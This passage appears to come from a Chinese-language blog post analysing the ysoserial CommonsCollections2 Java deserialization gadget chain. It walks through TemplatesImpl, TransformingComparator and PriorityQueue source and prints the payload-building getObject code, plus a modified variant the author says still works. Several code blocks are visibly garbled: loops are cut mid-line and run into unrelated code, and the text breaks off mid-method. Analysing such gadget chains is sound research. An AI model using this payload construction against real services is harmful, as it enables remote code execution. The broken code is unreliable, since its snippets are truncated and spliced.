回头看2）InvokerTransformer的iMethodName已经已经指定为newTransformer。
9）org.apache.xalan.xsltc.trax.TemplatesImpl的newTransformer  
结合5）和8，org.apache.xalan.xsltc.trax.TemplatesImpl的newTransformer方法将会被调用：
    public synchronized Transformer newTransformer() throws TransformerConfigurationException {
            TransformerImpl transformer = new TransformerImpl(this.getTransletInstance(),//需要跟进
            this._outputProperties, this._indentNumber, this._tfactory);
            if (this._uriResolver != null) {
                transformer.setURIResolver(this._uriResolver);
            }
            if (this._tfactory.getFeature("http://javax.xml.XMLConstants/feature/secure-processing")) {
                transformer.setSecureProcessing(true);
            }
            return transformer;
        }
10）org.apache.xalan.xsltc.trax.TemplatesImpl的getTransletInstance  
接着看this.getTransletInstance
    private Translet getTransletInstance() throws TransformerConfigurationException {
            ErrorMsg err;
            try {
                if (this._name == null) {
                    return null;
                } else {
                    if (this._class == null) {
                        this.defineTransletClasses();//需要跟进
                    }
                    AbstractTranslet translet = (AbstractTranslet)this._class[this._transletIndex].newInstance();//回头看
                    translet.postInitialization();
                    translet.setTemplates(this);
                    if (this._auxClasses != null) {
                        translet.setAuxiliaryClasses(this._auxClasses);
                    }
    //省略部分源码
        }
11）org.apache.xalan.xsltc.trax.TemplatesImpl的gdefineTransletClasses：
    private void defineTransletClasses() throws TransformerConfigurationException {
            if (this._bytecodes == null) {
                ErrorMsg err = new ErrorMsg("NO_TRANSLET_CLASS_ERR");
                throw new TransformerConfigurationException(err.toString());
            } else {
                TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() {
                    public Object run() {
                        return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader());
                    }
                });
                ErrorMsg err;
                try {
                    int classCount = this._bytecodes.length;
                    this._class = new Class[classCount];
                    if (classCount > 1) {
                        this._auxClasses = new Hashtable();
                    }
                    for(int i = 0; i  getObject(final String command) throws Exception {
            final Object templates = Gadgets.createTemplatesImpl(command);
            // mock method name until armed
            final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
            // create queue with numbers and basic comparator
            final PriorityQueue queue = new PriorityQueue(2,new TransformingComparator(transformer));
            // stub data for replacement later
            queue.add(1);
            queue.add(1);
实话说，其实我也不知道。但是我最初的说法（比较器要求元素类型一致，payload这么构造是为了防止序列化过程出现异常）肯定不严谨。  
简单分析
a.泛型
    final PriorityQueue queue = new PriorityQueue(2,new TransformingComparator(transformer));
PriorityQueue指定Object，1会被装箱成Integer，和templates都是Object的子类，因此这里编译不会有问题。
b.比较  
i. 如果放进PriorityQueue的元素不一致，会不会在比较时出现问题呢？
    public int compare(I obj1, I obj2) {
            O value1 = this.transformer.transform(obj1);
            O value2 = this.transformer.transform(obj2);
            return this.decorated.compare(value1, value2);
        }
回答上面的问题，需要看上面this.decorated.compare(value1, value2)会不会有问题。  
ii. 看看this.decorated
    public TransformingComparator(Transformer transformer) {
            this(transformer, ComparatorUtils.NATURAL_COMPARATOR);
        }
        public TransformingComparator(Transformer transformer, Comparator decorated) {
            this.decorated = decorated;//ComparatorUtils.NATURAL_COMPARATOR
            this.transformer = transformer;
        }
iii. ComparatorUtils.NATURAL_COMPARATOR 是何物
    public class ComparableComparator> implements Comparator, Serializable {
        private static final long serialVersionUID = -291439688585137865L;
        public static final ComparableComparator INSTANCE = new ComparableComparator();
        public static > ComparableComparator comparableComparator() {
            return INSTANCE;
        }
        public ComparableComparator() {
        }
        public int compare(E obj1, E obj2) {
            return obj1.compareTo(obj2);//元素的比较逻辑落在这里
        }
iv. 再回头看看i中value1和value2是什么
    final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
因为InvokerTransformer在初始化时已经指定toString,所以调用其transform方法就会得到String。既然都是String，比较当然没有问题！
`事实上，将CommsCollections2改造成如下也没有毛病`
    public Queue getObject(final String command) throws Exception {
            final Object templates = Gadgets.createTemplatesImpl(command);
            // mock method name until armed
            final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
            // create queue with numbers and basic comparator
            final PriorityQueue queue = new PriorityQueue(2,new TransformingComparator(transformer));
            // stub data for replacement later
            queue.add(templates);
            queue.add(new VerifyError("nothing"));
            // switch method called by comparator
            Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
            // switch contents of queue
            //final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
            //queueArray[0] = templates;
            //queueArray[1] = 1;
            return queue;
        }
所以，作者为什么这么写，也许更加优雅吧。
2）PriorityQueue的queue 已经使用transient关键字修饰，为什么还能从流中反序列化queue中的元素？  
成员使用transient关键字修饰，的确是为了序列化时不写入流中（该成员可能含有敏感信息，出于保护不写入）。这一点可以从序列化的文件中验证：  
但是，[序列化规范](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/output.html#a861
"序列化规范")允许待序列化的类实现writeObject方法，实现对自己的成员控制权。
PriorityQueue的确实现类writeObject方法，将队列中的元素写入流中：
    private void writeObject(java.io.ObjectOutputStream s)
            throws java.io.IOException{
            // Write out element count, and any hidden stuff
            s.defaultWriteObject();
            // Write out array length, for compatibility with 1.5 version
            s.writeInt(Math.max(2, size + 1));
            // Write out all elements in the "proper order".
            for (int i = 0; i   